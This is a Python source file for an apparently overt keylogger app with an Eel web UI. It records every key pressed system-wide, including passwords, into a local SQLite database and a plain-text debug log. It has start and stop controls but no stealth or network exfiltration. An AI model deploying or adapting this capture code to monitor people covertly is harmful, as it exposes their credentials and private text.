
"""
Keylogger Application (Expanded Version)

This script initializes a keylogger using the pynput library and logs all keypress events to a local SQLite database.
It also uses the Eel library to interact with a frontend UI built in HTML/JS/CSS.

Author: Original Author (expanded by ChatGPT)
"""

import eel
from pynput import keyboard
import sqlite3
from datetime import datetime
import logging

# ==========================
# Configuration & Constants
# ==========================

DATABASE_PATH = 'keystrokes.db'
LOG_FILE = 'keylogger_debug.log'

# Global flag for keylogging control
is_logging = False

# ==========================
# Logging Configuration
# ==========================

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s')

# ==========================
# Database Setup
# ==========================

def setup_database():
    """Initializes the SQLite database and creates the keystrokes table if it doesn't exist."""
    try:
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key_pressed TEXT,
                timestamp DATETIME
            )
        ''')
        conn.commit()
        logging.info("Database setup complete.")
    except Exception as e:
        logging.error(f"Error setting up database: {e}")
    finally:
        conn.close()

# ==========================
# Keystroke Handling
# ==========================

def log_keystroke(keystroke: str):
    """Logs a single keystroke to the database."""
    try:
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO keystrokes (key_pressed, timestamp)
            VALUES (?, ?)
        ''', (keystroke, datetime.now()))
        conn.commit()
        logging.info(f"Logged keystroke: {keystroke}")
    except Exception as e:
        logging.error(f"Error logging keystroke: {e}")
    finally:
        conn.close()

def on_press(key):
    """Callback for key press events."""
    if is_logging:
        try:
            keystroke = key.char
        except AttributeError:
            keystroke = str(key)
        log_keystroke(keystroke)

# ==========================
# Eel Frontend Bindings
# ==========================

@eel.expose
def start_logging():
    """Starts the keylogging session."""
    global is_logging
    is_logging = True
    logging.info("Keylogging started.")

@eel.expose
def stop_logging():
    """Stops the keylogging session."""
    global is_logging
    is_logging = False
    logging.info("Keylogging stopped.")

@eel.expose
def fetch_keystrokes():
    """Fetches all logged keystrokes from the database."""
    try:
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT key_pressed, timestamp FROM keystrokes ORDER BY timestamp DESC')
        results = cursor.fetchall()
        return results
    except Exception as e:
        logging.error(f"Error fetching keystrokes: {e}")
        return []
    finally:
        conn.close()

# ==========================
# Application Entry Point
# ==========================

def main():
    """Main function to start Eel and the keylogger listener."""
    setup_database()
    eel.init('web')
    eel.start('index.html', block=False)
    with keyboard.Listener(on_press=on_press) as listener:
        eel.loop.run_forever()

if __name__ == '__main__':
    main()
